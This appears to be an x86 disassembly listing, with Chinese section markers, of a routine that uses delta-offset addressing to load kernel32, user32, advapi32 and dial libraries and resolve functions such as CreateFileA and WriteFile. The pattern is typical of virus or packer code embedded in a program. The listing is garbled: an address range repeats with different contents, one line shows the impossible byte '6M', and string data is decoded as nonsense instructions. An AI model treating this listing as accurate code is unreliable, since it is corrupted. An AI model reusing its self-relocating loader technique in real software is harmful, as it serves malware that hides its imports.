
```
0001469A: 1100                      adc dword ptr [eax],eax

0001469C: 0800                      or byte ptr [eax],al

0001469E: 35002300C8                xor eax,C8002300

000146A3: 0000                      add byte ptr [eax],al

000146A5: 346C                      xor al,6C

000146A7: 0000                      add byte ptr [eax],al

000146A9: 0000                      add byte ptr [eax],al

000146AB: 0000                      add byte ptr [eax],al

****************************子程序 ID:CALL000146AD ****************************

000146AD: 60                        pushad

000146AE: BB85BA4000                mov ebx,0040BA85

000146B3: 03DD                      add ebx,ebp

000146B5: 807B0800                  cmp byte ptr [ebx+08],00

000146B9: 746D                      jz 00014728

000146BB: 8BC3                      mov eax,ebx

000146BD: 83C008                    add eax,00000008

000146C0: 50                        push eax

000146C1: FF9564BF4000              call dword ptr [ebp+0040BF64]     <--LoadLibraryA

000146C7: 89857DBA4000              mov dword ptr [ebp+0040BA7D],eax

000146CD: 83F800                    cmp eax,00000000

000146D0: 750C                      jnz 000146DE

000146D2: C78581BA400000000000      mov dword ptr [ebp+0040BA81],00000000

000146DC: EB4A                      jmp 00014728

000146DE: 8B33                      mov esi,dword ptr [ebx]

000146E0: 8B7B04                    mov edi,dword ptr [ebx+04]

000146E3: 03F5                      add esi,ebp

000146E5: 03FD                      add edi,ebp

000146E7: 803E00                    cmp byte ptr [esi],00

000146EA: 750E                      jnz 000146FA

000146EC: 83C308                    add ebx,00000008

000146EF: 803B00                    cmp byte ptr [ebx],00

000146F2: 7403                      jz 000146F7

000146F4: 43                        inc ebx

000146F5: EBF8                      jmp 000146EF

000146F7: 43                        inc ebx

000146F8: EBBB                      jmp 000146B5

000146FA: 56                        push esi

000146FB: FFB57DBA4000              push dword ptr [ebp+0040BA7D]

00014701: FF9568BF4000              call dword ptr [ebp+0040BF68]     <--GetProcAddress

00014707: 83F800                    cmp eax,00000000

0001470A: 750C                      jnz 00014718

0001470C: C78581BA400000000000      mov dword ptr [ebp+0040BA81],00000000

00014716: EB10                      jmp 00014728

00014718: 8907                      mov dword ptr [edi],eax

0001471A: 83C704                    add edi,00000004

0001471D: 803E00                    cmp byte ptr [esi],00

00014720: 7403                      jz 00014725

00014722: 46                        inc esi

00014723: EBF8                      jmp 0001471D

00014725: 46                        inc esi

00014726: EBBF                      jmp 000146E7

00014728: 61                        popad

00014729: 8B8581BA4000              mov eax,dword ptr [ebp+0040BA81]

0001472F: C3                        ret

****************************结束****************************

00014730: 0000                      add byte ptr [eax],al

00014732: 0000                      add byte ptr [eax],al

00014734: 0100                      add dword ptr [eax],eax

00014736: 0000                      add byte ptr [eax],al

00014738: E3BA                      jecxz 000146F4

0001473A: 40                        inc eax

0001473B: 009FBB40006B              add byte ptr [edi+6B0040BB],bl

00014741: 65726E                    jb 000147B2

00014744: 656C                      insb es:[edi],dx

00014746: 3332                      xor esi,dword ptr [edx]

00014748: 2E646C                    insb es:[edi],dx

0001474B: 6C                        insb es:[edi],dx

0001474C: 00D3                      add bl,dl

0001474E: BB400000BC                mov ebx,BC000040

00014753: 40                        inc eax

00014754: 007573                    add byte ptr [ebp+73],dh

00014757: 657233                    jb 0001478D

0001475A: 322E                      xor ch,byte ptr [esi]

0001475C: 646C                      insb es:[edi],dx

0001475E: 6C                        insb es:[edi],dx

0001475F: 0014BC                    add byte ptr [esp+edi*4],dl

00014762: 40                        inc eax

00014763: 0072BC                    add byte ptr [edx-44],dh

00014766: 40                        inc eax

00014767: 006164                    add byte ptr [ecx+64],ah

0001476A: 7661                      jbe 000147CD

0001476C: 7069                      jo 000147D7

0001476E: 3332                      xor esi,dword ptr [edx]

00014770: 2E646C                    insb es:[edi],dx

00014773: 6C                        insb es:[edi],dx

00014774: 008EBC4000B8              add byte ptr [esi-47FFBF44],cl

0001477A: BC40006469                mov esp,69640040

0001477F: 61                        popad

00014780: 6C                        insb es:[edi],dx

00014781: 2E646C                    insb es:[edi],dx

00014784: 6C                        insb es:[edi],dx

00014785: 0000                      add byte ptr [eax],al

00014787: 0000                      add byte ptr [eax],al

00014789: 0000                      add byte ptr [eax],al

0001478B: 0000                      add byte ptr [eax],al

0001478D: 0000                      add byte ptr [eax],al

0001478F: 0020                      add byte ptr [eax],ah

00014791: 2020                      and byte ptr [eax],ah

00014793: 2020                      and byte ptr [eax],ah

00014795: 383530343400              cmp byte ptr [00343430],dh

0001479B: 0000                      add byte ptr [eax],al

0001479D: 0000                      add byte ptr [eax],al

0001479F: 0000                      add byte ptr [eax],al

00014780: 6C                        insb es:[edi],dx

00014781: 2E646C                    insb es:[edi],dx

00014784: 6C                        insb es:[edi],dx

00014785: 0000                      add byte ptr [eax],al

00014787: 0000                      add byte ptr [eax],al

00014789: 0000                      add byte ptr [eax],al

0001478B: 0000                      add byte ptr [eax],al

0001478D: 0000                      add byte ptr [eax],al

0001478F: 0000                      add byte ptr [eax],al

00014791: 0000                      add byte ptr [eax],al

00014793: 0000                      add byte ptr [eax],al

00014795: 004765                    add byte ptr [edi+65],al

00014798: 7453                      jz 000147ED

0001479A: 7973                      jns 0001480F

0001479C: 7465                      jz 00014803

0001479E: 6M                        insd es:[edi],dx

0001479F: 54                        push esp

000147A0: 696D6500437265            imul ebp,dword ptr [ebp+65],65724300

000147A7: 61                        popad

000147A8: 7465                      jz 0001480F

000147AA: 46                        inc esi

000147AB: 696C654100577269          imul ebp,dword ptr [ebp+41],69725700

000147B3: 7465                      jz 0001481A

000147B5: 46                        inc esi

000147B6: 696C6500436C6F73          imul ebp,dword ptr [ebp],736F6C43

000147BE: 6548                      dec eax

000147C0: 61                        popad

000147C1: 6E                        outsb dx,ds:[esi]
```
